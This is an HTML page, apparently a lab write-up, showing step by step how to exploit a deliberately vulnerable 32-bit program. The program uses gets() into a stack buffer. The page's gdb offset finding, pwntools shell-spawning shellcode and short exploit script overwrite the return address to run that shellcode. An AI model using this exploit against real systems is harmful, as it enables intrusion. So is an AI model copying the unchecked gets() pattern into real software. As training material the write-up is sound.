@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>ret2shellcode - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">ret2shellcode</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1665974563497"
+                  >2022</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1665998133367"
+                  >2022</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-type">char</span> buf2[<span class="hljs-number">100</span>];
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);
+    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);
+
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"No system for you this time !!!\n"</span>);
+    gets(buf);
+    <span class="hljs-built_in">strncpy</span>(buf2, buf, <span class="hljs-number">100</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"bye bye ~"</span>);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre></div>
+<p>检查保护</p>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># checksec ret2shellcode </span>
+[*] <span class="hljs-string">'/root/pwn/ret2shellcode'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments</code></pre></div>
+<p>查看代码段</p>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># objdump -t -j .text ret2shellcode </span>
+
+ret2shellcode:     file format elf32-i386
+
+SYMBOL TABLE:
+08048430 l    d  .text	00000000              .text
+08048470 l     F .text	00000000              deregister_tm_clones
+080484a0 l     F .text	00000000              register_tm_clones
+080484e0 l     F .text	00000000              __do_global_dtors_aux
+08048500 l     F .text	00000000              frame_dummy
+08048640 g     F .text	00000002              __libc_csu_fini
+08048460 g     F .text	00000004              .hidden __x86.get_pc_thunk.bx
+080485d0 g     F .text	00000061              __libc_csu_init
+08048430 g     F .text	00000000              _start
+0804852d g     F .text	0000009a              main</code></pre></div>
+<p>查看分析其源码</p>
+<img src="/_resources/f663757e221f4308bcb8c822dc9500db.png" alt="faad731de44f8d04102ba8a76ce645f7.png" width="979" height="503" class="jop-noMdConv" />
+<p>可以看到，程序会获取输入的buf变量值，并将其复制至buf2变量中</p>
+<p>对buf2下断点可以看到buf2的地址为0x804a080</p>
+<div><pre class="hljs"><code>gdb-peda$ b *buf2
+Breakpoint 2 at 0x804a080</code></pre></div>
+<p>查看buf2数据段是否存在读写权限</p>
+<img src="/_resources/33e40e1e4a4042b48bb5fb0efdb42dab.png" alt="a4d57206454dffe9c7c22714dedfb98b.png" width="923" height="491" class="jop-noMdConv" />
+<p>接下来通过动态调试判断buf变量偏移距离</p>
+<p><img src="/_resources/6facbe40da144f8bbd3d73d8b53fb80d.png" /><img src="/_resources/de515808f0164f92b7a9cdd67cffa7e6.png" /></p>
+<p>可以看到无效地址为0x41384141，然后使用pattern_offset判断具体偏移距离为112</p>
+<div><pre class="hljs"><code>gdb-peda$ pattern_offset 0x41384141
+1094205761 found at offset: 112</code></pre></div>
+<p>然后我们生成shellcode，可以使用pwntools的shellcratft，如下</p>
+<div><pre class="hljs"><code>┌──(root㉿kali)-[~/pwn]
+└─<span class="hljs-comment"># python</span>
+Python <span class="hljs-number">3.8</span><span class="hljs-number">.0</span> (default, Jul <span class="hljs-number">12</span> <span class="hljs-number">2022</span>, <span class="hljs-number">11</span>:<span class="hljs-number">34</span>:<span class="hljs-number">11</span>) 
+[GCC <span class="hljs-number">11.3</span><span class="hljs-number">.0</span>] on linux
+<span class="hljs-type">Type</span> <span class="hljs-string">"help"</span>, <span class="hljs-string">"copyright"</span>, <span class="hljs-string">"credits"</span> <span class="hljs-keyword">or</span> <span class="hljs-string">"license"</span> <span class="hljs-keyword">for</span> more information.
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-meta">&gt;&gt;&gt; </span>shellcode = asm(shellcraft.sh())
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(shellcode)
+<span class="hljs-string">b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">len</span>(shellcode)
+<span class="hljs-number">44</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">112</span>-<span class="hljs-number">44</span>
+<span class="hljs-number">68</span>
+&gt;&gt;&gt;</code></pre></div>
+<p>从上面可以看到，shellcode的长度为44，那么剩下需要填充的长度为68,一共112可以覆盖ebp,然后修改返回值为shellcode所在buf2的地址</p>
+<p>exp如下</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+sh = process(<span class="hljs-string">'./ret2shellcode'</span>)
+shellcode = asm(shellcraft.sh())
+buf2_addr = <span class="hljs-number">0x804a080</span>
+
+sh.sendline(shellcode + <span class="hljs-string">b'a'</span>*<span class="hljs-number">68</span> + p32(buf2_addr))
+sh.interactive()</code></pre></div>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
